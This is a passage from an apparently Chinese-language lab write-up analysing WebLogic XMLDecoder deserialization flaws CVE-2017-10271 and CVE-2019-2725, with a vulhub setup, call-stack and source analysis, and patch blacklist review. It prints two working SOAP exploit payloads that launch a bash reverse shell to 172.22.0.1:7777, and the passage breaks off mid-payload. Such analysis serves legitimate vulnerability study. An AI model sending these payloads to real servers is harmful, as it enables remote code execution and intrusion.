class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid context type: object&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var7);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就是将object标签进行过滤，绕过方式就是将object修改成void，也就是CVE-2017-10271</p>
<h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><p><strong>环境搭建</strong>：<br>使用vulhub中的环境，修改docekr-compose.yml文件，加上8453端口的映射，使其能够调试<br><strong>复现</strong>：<br>exp:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/172.22.0.1/7777 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span> </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>bp抓包<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230822144140.png"><br>反弹shell成功<br><strong>远程调试</strong>：<br>进入容器，配置weblogic开启远程调试<br>改<code>/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code>文件，加入以下内容</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugFlag=&quot;true&quot;</span><br><span class="line">export debugFlag</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230822162900.png"><br>重启容器即可调试<br>将需要调试目录导出，放入IDEA，即可启动调试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">cp</span> 9e239f7fb3ff:/root ./cve201710271Env</span><br><span class="line"><span class="built_in">cd</span> cve201710271Env/Oracle/Middleware</span><br><span class="line"><span class="built_in">mkdir</span> lib</span><br><span class="line">find ./ -name <span class="string">&quot;*.jar&quot;</span> -<span class="built_in">exec</span> <span class="built_in">cp</span> &#123;&#125; ./lib/ \;</span><br><span class="line">find ./ -name <span class="string">&quot;*.war&quot;</span> -<span class="built_in">exec</span> <span class="built_in">cp</span> &#123;&#125; ./lib/ \;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong>：<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">readUTF:<span class="number">111</span>, WorkContextXmlInputAdapter (weblogic.wsee.workarea)</span><br><span class="line">readEntry:<span class="number">92</span>, WorkContextEntryImpl (weblogic.workarea.spi)</span><br><span class="line">receiveRequest:<span class="number">179</span>, WorkContextLocalMap (weblogic.workarea)</span><br><span class="line">receiveRequest:<span class="number">163</span>, WorkContextMapImpl (weblogic.workarea)</span><br><span class="line">receive:<span class="number">71</span>, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)</span><br><span class="line">readHeaderOld:<span class="number">107</span>, WorkContextTube (weblogic.wsee.jaxws.workcontext)</span><br><span class="line">processRequest:<span class="number">43</span>, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)</span><br><span class="line">__doRun:<span class="number">866</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">_doRun:<span class="number">815</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">doRun:<span class="number">778</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">runSync:<span class="number">680</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">process:<span class="number">403</span>, WSEndpointImpl$<span class="number">2</span> (com.sun.xml.ws.server)</span><br><span class="line">handle:<span class="number">539</span>, HttpAdapter$HttpToolkit (com.sun.xml.ws.transport.http)</span><br><span class="line">handle:<span class="number">253</span>, HttpAdapter (com.sun.xml.ws.transport.http)</span><br><span class="line">handle:<span class="number">140</span>, ServletAdapter (com.sun.xml.ws.transport.http.servlet)</span><br><span class="line">handle:<span class="number">171</span>, WLSServletAdapter (weblogic.wsee.jaxws)</span><br><span class="line">run:<span class="number">708</span>, HttpServletAdapter$AuthorizedInvoke (weblogic.wsee.jaxws)</span><br><span class="line">doAs:<span class="number">363</span>, AuthenticatedSubject (weblogic.security.acl.internal)</span><br><span class="line">runAs:<span class="number">146</span>, SecurityManager (weblogic.security.service)</span><br><span class="line">authenticatedInvoke:<span class="number">103</span>, ServerSecurityHelper (weblogic.wsee.util)</span><br><span class="line">run:<span class="number">311</span>, HttpServletAdapter$<span class="number">3</span> (weblogic.wsee.jaxws)</span><br><span class="line">post:<span class="number">336</span>, HttpServletAdapter (weblogic.wsee.jaxws)</span><br><span class="line">doRequest:<span class="number">99</span>, JAXWSServlet (weblogic.wsee.jaxws)</span><br><span class="line">service:<span class="number">99</span>, AbstractAsyncServlet (weblogic.servlet.http)</span><br><span class="line">service:<span class="number">820</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">run:<span class="number">227</span>, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)</span><br><span class="line">invokeServlet:<span class="number">125</span>, StubSecurityHelper (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">301</span>, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">184</span>, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">wrapRun:<span class="number">3732</span>, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">run:<span class="number">3696</span>, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">doAs:<span class="number">321</span>, AuthenticatedSubject (weblogic.security.acl.internal)</span><br><span class="line">runAs:<span class="number">120</span>, SecurityManager (weblogic.security.service)</span><br><span class="line">securedExecute:<span class="number">2273</span>, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">2179</span>, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">run:<span class="number">1490</span>, ServletRequestImpl (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">256</span>, ExecuteThread (weblogic.work)</span><br><span class="line">run:<span class="number">221</span>, ExecuteThread (weblogic.work)</span><br></pre></td></tr></table></figure>

<p>查看weblogic&#x2F;wsee&#x2F;jaxws&#x2F;workcontext&#x2F;WorkContextServerTube的processRequest方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> NextAction <span class="title function_">processRequest</span><span class="params">(Packet var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.isUseOldFormat = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (var1.getMessage() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取头部信息</span></span><br><span class="line">        <span class="type">HeaderList</span> <span class="variable">var2</span> <span class="operator">=</span> var1.getMessage().getHeaders();</span><br><span class="line">        <span class="comment">// 从消息的头部列表中获取指定的头部信息</span></span><br><span class="line">        <span class="type">Header</span> <span class="variable">var3</span> <span class="operator">=</span> var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (var3 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在指定的头部信息，则使用旧的格式进行读取处理，并将isUseOldFormat标记为true</span></span><br><span class="line">            <span class="comment">// 这里</span></span><br><span class="line">            <span class="built_in">this</span>.readHeaderOld(var3);</span><br><span class="line">            <span class="built_in">this</span>.isUseOldFormat = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 从消息的头部列表中获取JAX-WS工作区的头部信息</span></span><br><span class="line">        <span class="type">Header</span> <span class="variable">var4</span> <span class="operator">=</span> var2.get(<span class="built_in">this</span>.JAX_WS_WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (var4 != <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="comment">// 如果存在JAX-WS工作区的头部信息，则进行读取处理</span></span><br><span class="line">            <span class="built_in">this</span>.readHeader(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用父类的processRequest方法进行进一步处理，并返回NextAction对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.processRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230822211637.png"><br>进入weblogic&#x2F;wsee&#x2F;jaxws&#x2F;workcontext&#x2F;WorkContextTube的readHeaderOld方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">readHeaderOld</span><span class="params">(Header var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 读取Header中的XML数据流</span></span><br><span class="line">        <span class="type">XMLStreamReader</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readHeader();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        var2.nextTag();</span><br><span class="line">        <span class="comment">// 创建XMLStreamReaderToXMLStreamWriter实例，用于将XMLStreamReader的数据桥接到XMLStreamWriter</span></span><br><span class="line">        <span class="type">XMLStreamReaderToXMLStreamWriter</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLStreamReaderToXMLStreamWriter</span>();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">XMLStreamWriter</span> <span class="variable">var5</span> <span class="operator">=</span> XMLStreamWriterFactory.create(var4);</span><br><span class="line">        var3.bridge(var2, var5);</span><br><span class="line">        var5.close();</span><br><span class="line">        <span class="comment">// 创建WorkContextXmlInputAdapter实例，并将XML数据流转换为适配器可接受的输入流</span></span><br><span class="line">        <span class="type">WorkContextXmlInputAdapter</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WorkContextXmlInputAdapter</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(var4.toByteArray()));</span><br><span class="line">        <span class="comment">// 调用receive方法处理适配器中的输入流</span></span><br><span class="line">        <span class="built_in">this</span>.receive(var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</span><br><span class="line">        <span class="comment">// 抛出WebServiceException异常，表示在处理XML数据流时出现错误</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var7);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">        <span class="comment">// 抛出WebServiceException异常，表示在读取或处理输入流时出现错误</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var8);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法将XML数据流转换为字节数组，并通过适配器将其转换为可处理的输入流。然后，调用receive方法处理适配器中的输入流<br>其中进入WorkContextXmlInputAdapter的构造函数，它实例化了一个XMLDecoder对象，并将输入的xml输入流作为参数，这与前面的测试例子一样，现在目标是需要调用readObject进行反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">WorkContextXmlInputAdapter</span><span class="params">(InputStream var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.xmlDecoder = <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230822213156.png"><br>进入weblogic&#x2F;wsee&#x2F;jaxws&#x2F;workcontext&#x2F;WorkContextServerTube的receive方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">receive</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 获取WorkContextMapInterceptor实例</span></span><br><span class="line">    <span class="type">WorkContextMapInterceptor</span> <span class="variable">var2</span> <span class="operator">=</span> WorkContextHelper.getWorkContextHelper().getInterceptor();</span><br><span class="line">    <span class="comment">// 调用WorkContextMapInterceptor的receiveRequest方法，将WorkContextInput对象传递给拦截器进行处理</span></span><br><span class="line">    var2.receiveRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的var1是前面创建的WorkContextXmlInputAdapter对象，后面的receiveRequest、receiveRequest、readEntry等方法中都是WorkContextXmlInputAdapter对象，直到进入weblogic&#x2F;wsee&#x2F;workarea&#x2F;WorkContextXmlInputAdapter的readUTF方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">readUTF</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> (String)<span class="built_in">this</span>.xmlDecoder.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它调用了readObject方法对目标xml进行反序列化，从而触发命令执行。后面XMLDecoder的调用链和3.2.2中的测试是一致的<br><strong>补丁分析</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">   <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="type">int</span> <span class="variable">overallarraylength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:object&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;new&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:new&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;method&quot;</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:method&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;void&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">attClass</span> <span class="operator">=</span> <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     <span class="keyword">if</span>(!<span class="string">&quot;index&quot;</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid attribute for element void:&quot;</span> + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;array&quot;</span>)) &#123;</span><br><span class="line">                  <span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">                  <span class="keyword">if</span>(var9 != <span class="literal">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">&quot;byte&quot;</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;The value of class attribute is not valid for array element.&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用黑名单对上述标签进行了过滤</p>
<h3 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h3><p><strong>影响范围</strong>：<br>WebLogic 10.X<br>WebLogic 12.1.3<br><strong>影响uri</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/_async/AsyncResponseService</span><br><span class="line">/_async/AsyncResponseServiceJms</span><br><span class="line">/_async/AsyncResponseServiceHttps</span><br><span class="line">/_async/AsyncResponseServiceSoap12</span><br><span class="line">/_async/AsyncResponseServiceSoap12Jms</span><br><span class="line">/_async/AsyncResponseServiceSoap12Https</span><br></pre></td></tr></table></figure>

<p><strong>复现</strong>：<br>exp：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/172.22.0.1/7777 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 